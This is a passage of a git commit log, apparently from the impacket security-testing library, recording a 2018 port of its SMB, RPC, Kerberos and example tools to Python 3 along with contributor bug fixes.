Date:   Wed Oct 17 12:05:40 2018 -0300

    sniff.py Python3 port

commit 3b725fb82d7a28491f5ca34bdb880cc93fbf31f0
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 21:07:10 2018 -0300

    Dot11 testcases Python3 port
    
    - Not all tests yet passing but almost there

commit ea5fbbb28759fdea9c7f9b52158c38e8c333b586
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:54:40 2018 -0300

    ImpactPacket remaining test cases ported to Python3

commit e5aca347865d0e6210cd42d9aa1783c039b5fc06
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:34:09 2018 -0300

    test_TCP.py example Python3 port

commit e7899fbd2cd52dc9c50361f57701df874e3af97f
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 16:01:57 2018 -0300

    dns.py Python3 port

commit a339e62611ca63f0e31e128fd219988a38247ca2
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 14:03:22 2018 -0300

    registry-read.py Python3 port

commit 92f849c541e8ce85ec722297dd769059b8fcbfc9
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 13:10:21 2018 -0300

    rdp_check.py Python3 port

commit 02f872312214433b71a861dc83842edb36d63b37
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 16 13:02:01 2018 -0300

    Initial ntlmrelayx.py Python3 port
    
    - Lots of testing needed, there will mostly be opened bugs both on PY2 and PY3, please test on both versions.
    - ldapdomaindump (cc dirkjanm) does not support Python3 so this attack is not available in the PY3 version (until port for that module is done)

commit 62b0cc65175849e29cd4d087d70dad2c549e2bfe
Author: asolino <bethus@gmail.com>
Date:   Sat Oct 13 20:24:48 2018 -0300

    smbrelayx.py Python3 port
    
    - All related modules ported as well
    - ntlmrelayx.py coming next

commit 2425c0823537c430896c14c0e6f42319ebfb2917
Author: asolino <bethus@gmail.com>
Date:   Sat Oct 13 11:44:45 2018 -0300

    raiseChild.py Python3 port

commit 2bddcc68ed396c2dda2810c6492d28bc5c9b40e8
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 17:26:51 2018 -0300

    Adding future as a package req

commit d8aada311ab6176b21287dc3471a3aafed887430
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 17:02:46 2018 -0300

    Mimikatz.py Python3 port
    
    - test_mimilib.py and mimilib.py ports as well

commit 948deadebe4d963b421b4fe7629d872f6ec51cc6
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 12 16:39:47 2018 -0300

    mssqlclient.py, mssqlinstance.py Python3 ports
    
    - tds.py ported as well

commit 1d94b7f8ea5396d748a69f96552eb05756d110f2
Merge: 94ec775f 9a0947d3
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:45:17 2018 -0300

    Merge branch 'master' into python36

commit 9a0947d3c0b396321cb61c51a45a9e736c8532c4
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:45:03 2018 -0300

    Deleting unreachable code

commit 4473816f9247e5f42e08e23f78cf36dd52adb680
Merge: 9aa29f25 d8f13943
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 11 18:44:30 2018 -0300

    Merge pull request #497 from cclauss/patch-1
    
    Don't forget self...  Undefined name: data --> self.data

commit 94ec775fa6da173f3e3e5467db6536bed94779a9
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:32:32 2018 -0300

    Fixing imports

commit f70d0cc847b1f197f641edfb52f2876d0274c776
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:21:05 2018 -0300

    Adding py36 envtest. Not all tests passing tho.

commit 16d658e4d9277167125c4fd5c7bff2874959bc35
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 18:02:52 2018 -0300

    RPC NRPC port for Python3
    
    - test_nrpc.py passing (PY2/PY3)

commit 3e911898b36918e412f596dbed56a2cc4efed9a3
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:37:35 2018 -0300

    karmaSMB.py Python3 port

commit b69cb4932c7a369e5209d11b72526466d719ed50
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:24:03 2018 -0300

    sambaPipe.py initial Python3 port

commit 48d1115264bdbcd4b1495aa1d592f6447057bf2b
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:21:25 2018 -0300

    GetADUsers.py Python3 port

commit a9dec87e4d01c60da96b810a4f0af09422b02f92
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 13:10:40 2018 -0300

    GetNPUSers.py Python3 port

commit f3e43b8b807e174ac28f51cf5fc6c7e6d9d1f273
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 11 12:54:35 2018 -0300

    Fixing -outputfile scenario in Python3

commit 279cc0e11b6bba639669396677cf3aa9e448b2af
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 22:51:11 2018 -0300

    Minor fixes detected when running test cases

commit ba29ac60822827850d5474702d6389bfe6c9cf85
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 22:50:18 2018 -0300

    GetUserSPNs.py Python3 port
    
    - test_ldap.py passing (PY2 / PY3)

commit eba021977a75b701ab32d7014fe948168bb6ccc1
Merge: 61d4282b 9aa29f25
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 18:24:44 2018 -0300

    Merge branch 'master' into python36

commit 61d4282b5da76621bb7618a535f1abed324878fa
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 18:24:22 2018 -0300

    smbserver.py and smbexec.py Python3 port

commit 9aa29f251511dd7d18d24f794526698e28a3fe88
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 10 15:51:06 2018 -0300

    Update README.md

commit 63429c46a7b0ad06913bcb930b2c8c869892dada
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 10 15:48:56 2018 -0300

    So long and thanks for all the bits Core :)
    
    - Still need to change each file's copyright, coming soon

commit 5de6ff018f997ae3ad73e245ff2dc27ae8bb1f95
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 17:19:33 2018 -0300

    test_ndr.py ported to Python3

commit 4e67af4ef1b40ac86792eec1dbae86457b8c6115
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:40:20 2018 -0300

    netview.py Python3 port

commit 62f32007b61579810895edfe873156460b3ed515
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:27:10 2018 -0300

    ifmap.py and opdump.py Python3 ports

commit 1c5c275dad80fb68b63f290d69e6d46dee36eeab
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 13:22:08 2018 -0300

    goldenPac.py port to Python3

commit 8ff82b5e13a0ecbb111841ceac421033880df656
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 9 12:46:19 2018 -0300

    ticketer.py port to Python3

commit de513d7b43c183d24d6e3c8431206bd6dc51e380
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 17:45:53 2018 -0300

    getST.py port to Python3

commit 960ba26b6493d2d05f9dab05b050adb9dbbeb4f2
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:24:29 2018 -0300

    getArch.py Python3 port

commit 01ff739dfb5a0af54289428827fc5ac3d3aa01b4
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:22:39 2018 -0300

    getTGT.py and getPac.py Python3 port

commit 13499763e0297d06cb4897636a2b60ff70d2ec44
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 16:21:57 2018 -0300

    Adjusting CCACHE manipulation for Python3

commit 752f8c2a6ead576bc626966b237a467390f2ca08
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:27:19 2018 -0300

    If we have an object that can serialize itself, go ahead

commit 3ee4f5a07659c9e240e7c7c46d04004614373db2
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:12:27 2018 -0300

    Getting ready for Python3 port
    
    - Getting rid of unnecesary str()
    - Using getData() when neccesary

commit 041da62dc9d31dc8f3791b60ab06277a5cd7dbbb
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 8 13:04:17 2018 -0300

    We shouldn't be decoding first
    
    - Unless we receive bytes(), but we shouldn't (yet)

commit 89954d7577206537751812c281799dc6a2fb8b7d
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:34:31 2018 -0300

    DCOM WMI port for Python3
    
    - test_wmi.py passing (PY2 / PY3)
    - secretsdump.py, wmiexec.py, wmipersist.py and wmiquery.py ports as well.

commit 512329c54fbc0fed63e709100f582da830560651
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:32:11 2018 -0300

    dcomexec.py port to Python3

commit a08db9f6442d9c036bf19d223751856a45584479
Author: asolino <bethus@gmail.com>
Date:   Fri Oct 5 17:11:51 2018 -0300

    ESE engine port for Python
    
    - esentutl.py example ported as well.

commit 7bd587a302c891264c19b7df5ea4a0cb886ae0c8
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 17:11:12 2018 -0300

    DCOMRT port for Python3
    
    - test_dcomrt.py passing (PY2/PY3)

commit 3d64d6f2865b74b768869fedde65df7543e56698
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:34:03 2018 -0300

    RPC BKRP port for Python3
    
    - test_bkrp.py passing (PY2/PY3)

commit f7d452a1c677d3b26529394f4e1ca72f267cccb5
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:26:36 2018 -0300

    RPC DHCPM port for Python3
    
    - test_dhcpm.py passing (PY2/PY3)

commit 6ed6a6f68920688901fdd322c835e973405a1c93
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:16:14 2018 -0300

    RPC EVEN6 port for Python3
    
    - test_even6.py passing (PY2/PY3)

commit b5196779d343ebbc6c6c8e8ea2cdcf4f5e7da0bb
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 16:06:22 2018 -0300

    RPC DRSUAPI port for Python3
    
    - test_drsuapi.py passing (PY2/PY3)

commit 0324abcc63458e7cfec7e8a8a4a77198a0146137
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 15:25:04 2018 -0300

    rpcdump.py port for Python3

commit 73d69315add4ee77681df5bcddc63a440958be83
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 14:31:37 2018 -0300

    psexec.py (and related libs) port to Python3

commit 989c19cc91b0de59ef2a78a4fcfb1b6a978b4ec7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 14:06:29 2018 -0300

    RPC RRP port for Python3
    
    - test_rrp.py passing (PY2 / PY3)
    - reg.exe example working

commit bb517ef209a746fd98ba892135fc76d8020853bc
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 11:01:37 2018 -0300

    RPC WKST port for Python3
    
    - test_wkst passing (PY3 / PY2)

commit fecdb81b3e76f9edc8447d605d0ac9b3beafdfa7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:51:39 2018 -0300

    RPC SRVS port for Python3
    
    - test_srvs.py passing (PY2 / PY3)

commit 62d85738bd6078ccafe93fe83844e03d5dad6ef7
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:45:47 2018 -0300

    RPC SASEC, TSCH, ATSVC port for Python3
    
    - test_tsch.py passing (PY3 / PY2)
    - atexec.py example working

commit e210c3f60917d494e054ce0127dd6cc1c478ecd8
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:35:48 2018 -0300

    lookupsid.py Python3 support

commit 2751fc39a89d0308c38b01c68967c1b2c965575c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:32:10 2018 -0300

    RPC SCM port for Python3
    
    - test_scmr.py passing (PY2 / PY3)

commit ba10fb52a595f892c7dc1b6e733a36a30604178c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 3 10:31:01 2018 -0300

    samrdump.py Python3 port

commit 50d4ba77a21431164aab80c2e7c90f44298f18d6
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 21:52:13 2018 -0300

    RPC SAMR port for Python3
    
    - test_samr.py passing (PY2 / PY3)

commit b30735f2ad3754af7a7b0639580128b5e05984cf
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 17:38:16 2018 -0300

    NMB layer port to Python3
    
    - test_nmb.py passing (PY2/PY3)

commit a45fb7435028b2076702d388fa4438ae30ebcc90
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 15:05:59 2018 -0300

    RPC MGMT port for Python3
    
    - test_mgmt.py passing (PY2/PY3)

commit 535f3296ab86770021b799d4bda2695fb4c11236
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 14:58:49 2018 -0300

    RPC LSAD and LSAT port for Python3
    
    - test_lsad.py and test_lsat.py both passing (PY2/PY3)

commit c82c04d9336c4473e10334104268501f8a5f3891
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 14:37:21 2018 -0300

    EPM and RPCRT port for Python3
    
    - test_epm.py and test_rpcrt.py both passing (PY2/PY3)

commit 0a4c7872b4626bb1ec4fbd750b7573a850f8195a
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 12:59:16 2018 -0300

    Initial smbclient.py and related libs port to Python3
    
    - You should be able to run it with Python2 and 3
    - As a side effect other libs were also initially ported. Not finished and just in the context of smbclient.py

commit f77bf8e25103d8cbdee5a905baeee09ea8fb0a57
Author: asolino <bethus@gmail.com>
Date:   Tue Oct 2 12:54:02 2018 -0300

    Initial NDR runtime port to Python3
    
    - Python2 testcases still working
    - Python3 unit tests working

commit 49d06bedca6ad4d3246b80c907b25f2cb3767d96
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 1 17:04:43 2018 -0300

    Python3 adaptation
    
    - Getting rid of string.* functions
    - Setting b'' wherever needed
    - Using getData() instead of str()

commit 83898fa4b95a653bdb346b95d3bf305032a0b2c3
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 1 17:00:58 2018 -0300

    Setting binary data on some Py2 strings

commit 35a5503662449db469ea1224a060f61d936f58e5
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:30:16 2018 -0300

    Adjusting SMB3_DIALECT code to Python3

commit 12911cec68c20e82d7056446e43a1cd2092c740d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:18:58 2018 -0300

    Fixing test cases for Python3

commit 77ecab6aafc76b0a773e89f3d9878b281740f4aa
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:18:05 2018 -0300

    Handle situations where SMB.FLAGS2_UNICODE is used

commit 0bced5dd0eccf0c56ba0cddd4472476061a0914d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:07:00 2018 -0300

    Fix to handle FLAGS2_UNICODE scenario
    
    1. In the packet, we encode the data
    2. For further calls, we don't

commit 60297cd0ca98b31cceb632dd2d94cdb2aeb5956c
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 20:06:07 2018 -0300

    Minor indentation fixes

commit d1bf31dcf58b19d78a493669c1be7a2f1daff1af
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:58:58 2018 -0300

    Already receiving bytes, no need to convert

commit c2fc46398444570d7ed17a0d643a8c32cd869004
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:14:20 2018 -0300

    Minimal Python3 ports, lot of stuff left

commit be26e65279fc6c42ee465db20c08302aab96287e
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:13:53 2018 -0300

    Removing lonely raise ;)

commit cadc791ffeb3b189ad6d6e54d08bf00449e20dbc
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 19:13:24 2018 -0300

    Removing exceptions, and str() for the right pyasn1 representations

commit 470777fcc06e0b613821b2674c5f59fbff990599
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 18:31:10 2018 -0300

    Need to get the Unicode/str representation for later conversion

commit 87595e51572f6ee18b0b3ff90a0b7458c0af11d7
Merge: e3365558 97d36f0d
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 18:30:43 2018 -0300

    Merge branch 'master' into python36

commit e3365558b2f87589db82a939ec98bb03f76e844b
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:27:52 2018 -0300

    Porting testcases to Python3
    
    - Slowly :)

commit a5f0b62927ddb6462d3d4121dce742051324781a
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:26:32 2018 -0300

    Initial support for Python3 (nmb/smb layer)
    
    - Python3 test cases still not ran
    - Python2 test cases working

commit f4c373008b2fb69f455fca2993127394c340eee8
Author: asolino <bethus@gmail.com>
Date:   Sun Sep 30 10:22:16 2018 -0300

    Initial Python3 support for Kerberos layer
    
    - Test cases still not working
    - Test cases for Python 2 passing.

commit d8f139435e282ce2d6a5df58f9d8bc9a3b028fac
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 22:22:26 2018 +0200

    Don't forget self...  Undefined name: data --> self.data
    
    Partial fix for #494.  __data__ is an _undefined name_ in this context which will probably raise a NameError at runtime but each __Address__ object has a __self.data__ attribute.

commit 97d36f0dae93f0dc94fbc5ff76131e6c87e15918
Merge: 00583949 25c7e067
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 28 12:32:49 2018 -0300

    Merge pull request #496 from cclauss/patch-2
    
    Undefined name: Typo Dot11DataWPADataDecoder --> Dot11WPADataDecoder

commit 0058394905611d49b58a9ea3f7051fe52801a273
Merge: 55c16583 5916277b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 28 12:31:47 2018 -0300

    Merge pull request #495 from cclauss/patch-1
    
    Undefined name: Typo 'max_data' --> 'max_data_len'

commit 25c7e067eef3adcffbb7401a0b53f51760d1349b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 12:32:33 2018 +0200

    Undefined name: Typo Dot11DataWPADataDecoder --> Dot11WPADataDecoder
    
    Partial fix for #494.  __Dot11DataWPADataDecoder__ is an _undefined name_ in this context but  __Dot11WPADataDecoder__ is defined 10 lines below.

commit 5916277b171326537fa6fe2ffc9c51c947edaddd
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Sep 28 12:20:00 2018 +0200

    Undefined name: Typo 'max_data' --> 'max_data_len'
    
    Partial fix for #494.  __max_data__ is an _undefined name_ in this context but __max_data_len__ is defined a few lines above and is used in the conditional on the previous line that triggers the execution of this code.

commit 55c165836f020ecec6019ae0e51d3c4f56c6823a
Author: asolino <bethus@gmail.com>
Date:   Thu Sep 6 15:11:40 2018 -0300

    Adding -port switch used to specify binding port

commit 324ab03caf41e6f63d11b3b20fd0bab81587c51f
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 16:41:28 2018 -0300

    Fixing test case

commit 36d57e532dcadf0f628d068e60e09f30e5602916
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 16:27:29 2018 -0300

    Removing PyCrypto messages and replacing them with pycryptodomex

commit 6710253f48c2ba4a272154011c5cf35c929761e5
Merge: 982d170d b2541065
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 4 13:40:37 2018 -0300

    Merge branch 'fox-it-pycryptodome'

commit b2541065e2406f37090d2aa6d44a0a8beed48845
Merge: 982d170d 860f7b09
Author: asolino <bethus@gmail.com>
Date:   Fri Aug 31 12:21:32 2018 -0300

    Resolved merge conflict

commit 982d170d11d88b94c76670a505884a97d6ecf4e8
Merge: 554bf731 f22c74b6
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 18:42:15 2018 -0300

    Merge branch 'qlemaire-add-decryption-error-exception'

commit f22c74b69107e1f95b0df225229d0961164c2a80
Merge: 554bf731 306cfbdb
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 17:06:05 2018 -0300

    Merge branch 'add-decryption-error-exception' of https://github.com/qlemaire/impacket into qlemaire-add-decryption-error-exception

commit 554bf7319d222a409979061ebde0eb3959c495c4
Merge: 3214ddc0 468eff89
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Aug 26 16:07:01 2018 -0300

    Merge pull request #486 from qlemaire/fix-nopreauth-noaes
    
    Fix "no pre-auth and RC4" handling in GetKerberosTGT

commit 3214ddc0cf4c15e607914a3bc498b1dc8dd04a64
Author: asolino <bethus@gmail.com>
Date:   Sun Aug 26 16:05:29 2018 -0300

    Enforcing specific flask version

commit 306cfbdb5238738f05b42c89e60a5ece29c2d901
Author: Quentin Lemaire <sec@quentinlemaire.fr>
Date:   Sun Aug 26 15:15:28 2018 +0200

    Catch decryption error and add context information
    
    When decrypting session key from the AS-REP message, we might
    encounter decryption error such as invalid checksum if the
    provided key is not the right one (when pre-auth is disabled
    for instance).
    
    We now add a SessionKeyDecryptionError exception with context
    information about the decryption error (key, cipher, cipherText
    and AsRep). This may give information to the exception handler
    about what happened.
    
    Finally, the exception handler will be able to compute john hash
    from the exception, which was not possible with the InvalidChecksum
    exception.

commit 468eff89dfb0eed3e538b0da648a1a51fd823670
Author: Quentin Lemaire <sec@quentinlemaire.fr>
Date:   Sun Aug 26 14:25:36 2018 +0200

    Fix "no pre-auth and RC4" handling in GetKerberosTGT
    
    When there was no pre-authentication and server doesn't handle other
    cipher suites than RC4, the encryptionTypesData table remained empty,
    leading to a KeyError while deriving NTLM hash from password.
    
    We now populate the encryptionTypesData table with an empty salt (not
    needed with RC4) when pre-auth is disabled.

commit 860f7b0920d328b289e78e5c77e7f4070d63087b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Aug 25 17:27:53 2018 +0200

    Also update pycryptodome requirement in setup.py

commit 53b4395aa052024c6dce58436288a5ba804bbbc8
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Aug 25 17:25:17 2018 +0200

    Replace pycrypto with pycryptodome

commit 28a3deae4749d867e3610f34492f8312f622c20d
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 22 18:25:29 2018 -0300

    SOCKS support for the supported protocol at non-default ports
    
    * E.g. MSSQL at a random port (not 1433), or HTTP server at 8080.
    * SOCKS Server doesn't look for a handler anymore by inspecting the socksPlugin dictionary but instead looking at the active relays and then extracting the protocol schema from there (this is new) and the using whatever plugin for that schema we have.
    * Now the PLUGIN_SCHEME variable plays a very important role. It must match the scheme used when calling this script (e.g. smb://).
    * Testing is needed to ensure no colateral damage was introduced.
    * Should address https://github.com/CoreSecurity/impacket/issues/483

commit 3fa456ba307abeffc5d15165254f9d37ef6485e4
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 22 18:22:56 2018 -0300

    Fixed -socks support functionality
    
    * Wasn't working before due to all the changes made via ntlmrelayx.py

commit 9b07e5b0e980bfe87bafb2ad3f9c6326127a36e1
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 8 18:31:19 2018 -0300

    Using TLSv1_2_METHOD and adding AES as cipher list for SSL connection
    
    * Also increasing the PyOpenSSL version required to match whatever is needed for this to work
    * Should address https://github.com/CoreSecurity/impacket/issues/429, testing is needed

commit 91bfb763294c6e326e4e91ec38fff8cdc4a3ce3c
Merge: 678a1648 c6d5034b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 8 15:50:15 2018 -0300

    Merge pull request #480 from mohemiv/master
    
    Added different output types for DCC hashes (secretsdump.py)

commit c6d5034b92bf61918ec47947320424ceac88dd00
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Aug 8 18:18:04 2018 +0300

    Changed display name for DCC hashes (secretsdump.py)

commit d37495c32872d578b2f05af32b5ec1c8391f1cd1
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Aug 7 21:08:35 2018 +0300

    Added different output types for DCC hashes (secretsdump.py)

commit 678a16485a31555aceabdcf962780768bf413d70
Merge: cf87a712 1ee97ad9
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 15:51:47 2018 -0300

    Merge branch '8com-for_upstream/fix_win2016_lm_decryption'

commit 1ee97ad9eff040c30057ed08fb953b5d989eb540
Merge: cf87a712 f6bd611a
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 15:49:39 2018 -0300

    Merge branch 'for_upstream/fix_win2016_lm_decryption' of https://github.com/8com/impacket into 8com-for_upstream/fix_win2016_lm_decryption

commit f6bd611a578f6e68628468385a3bda3984a55adb
Author: Michael Niewoehner <michael.niewoehner@8com.de>
Date:   Mon Aug 6 17:14:47 2018 +0200

    Fix Win2016 LM decryption

commit cf87a712977d812211da083801b932d6dc5a9ae1
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 6 13:12:08 2018 -0300

    Returning str in Python2 instead of Unicode for 'z' data type
    
    - Decoding a bytestring and returning Unicode was breaking wmipersist.py functionality. We need to better investigate the reasons tho. This change shouldn't alter any other functionality
    - hexdump under Python3 was broken, now working back again.

commit c47c6c234781b2fcca4fde3536ab5a413f9b964a
Merge: c03e31c2 a15fb570
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 1 13:11:58 2018 -0300

    Merge pull request #478 from MrTchuss/fix_ntlmrelayx-encoding
    
    Fix ntlmrelayx encoding

commit a15fb570cdd72582677b3034190e678497d5f826
Author: MrTchuss <buffer@0x90.fr>
Date:   Wed Aug 1 15:54:35 2018 +0200

    Fixed admin group lookup in ntlmrelayx
    
    Administrators group name change depending on the target locale. It's
    better to rely only on this group RID (544)

commit c41b8bb5018faad5130e91f2ceec56d316b7d502
Author: MrTchuss <buffer@0x90.fr>
Date:   Wed Aug 1 15:54:12 2018 +0200

    Fixed encoding errors in ntlmrelayx
    
    Some account names are UTF16-LE encoded.
    Calls to print functions with format must be specified as unicode and
    ASCII must be converted to UTF16-LE.

commit c03e31c2dc87b42a5e6a63476ef859a8ee7d6a62
Merge: 347baa71 bf5704a0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jul 30 12:02:03 2018 -0300

    Merge pull request #475 from bao7uo/master
    
    Update serviceinstall.py

commit 2dbaf8b06cf29036830e994fc849d028fe67a6e6
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Mon Jul 30 09:58:41 2018 +0300

    Update dhcpm.py

commit bf5704a08a4ab30f98ebf849ef186e21cc7e634c
Author: Paul Taylor <21125224+bao7uo@users.noreply.github.com>
Date:   Sat Jul 28 17:52:33 2018 +0100

    Update serviceinstall.py
    
    minor typo

commit 347baa71b9c6178575fff7072d68041efefe437e
Merge: 10475066 1d1e6076
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 17 21:43:36 2018 -0300

    Merge pull request #471 from MrRobot86/patch-2
    
    Update dns.py (the infinite loop within the parseCompressedMessage)

commit 1d1e60764253629b52cd2873bb07a0b013ef6cd7
Author: MrRobot86 <41348964+MrRobot86@users.noreply.github.com>
Date:   Tue Jul 17 17:11:13 2018 -0700

    Update dns.py
    
    The infinite loop is getting possible within the parseCompressedMessage because the newly pointer may point to the current offset but the function haven't  got the check of the pointer value.

commit ca456a4535b236d8711a3f180fc20f31a432b26e
Merge: 10475066 576dde1e
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 12 09:34:33 2018 -0300

    Merge branch 'patch-5' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-5

commit 576dde1e34f0237f1cd615c19a01e60322edd5f5
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Jul 12 15:06:30 2018 +0300

    Update dhcpm.py
    
    I added 'commonHdr' field and removed the places where 'enumItems' property was unnecessarily used.
    Works fine now.

commit 104750660152622c13f787e731a4239dc5cf6680
Merge: c40223a6 1f96dc45
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jul 10 15:30:05 2018 -0300

    Merge pull request #469 from franferrax/master
    
    Making more flexible the exporting functions so we can customize the file opening function

commit c40223a6fed338908c06f0442ebdf0dd90fd8b1a
Merge: 0b6e23f5 895b862e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Jul 7 09:04:06 2018 -0300

    Merge pull request #470 from fox-it/aclfixes
    
    Optimize ACL enumeration and improve error handling in ntlmrelayx LDAP attack

commit 895b862eb6a1a92cacdf1b06874ebc8c94c3cfbd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jul 7 11:07:42 2018 +0200

    Optimize ACL enumeration and improve error handling in ntlmrelayx LDAP attack

commit 0edd6989dd45223b967c64508599354abe1f5901
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jul 7 11:15:43 2018 +0200

    ntlmrelayx ldap attack: also show where we create the user

commit 1f96dc45d0e24afb95a6e4ffbc43d992dc3afdad
Author: fferrari <fferrari@coresecurity.com>
Date:   Fri Jul 6 00:35:14 2018 -0300

    Making more flexible the exporting functions so we can customize the file opening function.
    * Modified export functions:
      * `SAMHashes.export()`
      * `LSASecrets.exportSecrets()`
      * `LSASecrets.exportCached()`
      * `NTDSHashes.dump()`

commit 0b6e23f5edf18d89e513287790f602e356d92235
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 5 10:06:51 2018 -0300

    Changing ldap3 release number
    
    Fixes https://github.com/CoreSecurity/impacket/issues/466

commit b2033f35dfbeac0b436f7b767783c46a5727395c
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Jul 1 10:27:16 2018 +0300

    Fixed a few bugs
    
    Hi man,
    Since the last commit, code generates a few errors, so I fixed them.
    1. DHCP_ALL_OPTION_VALUES was configured twice, so I change one of them to be DHCP_ALL_OPTIONS_VALUES.
    2. If you don't use .value in the NDRUNION declaration, code generates 'union tag doesn't exist' error.

commit 5671e8467a97b21585fcf56a6b9735da389f1b88
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 20 12:32:01 2018 -0300

    If we do Kerberos, it should be set at DCE level as well
    
    * Should address https://github.com/CoreSecurity/impacket/issues/461

commit ad27f0a5b0a299c5a7e6ef28bd35261740dea357
Author: asolino <bethus@gmail.com>
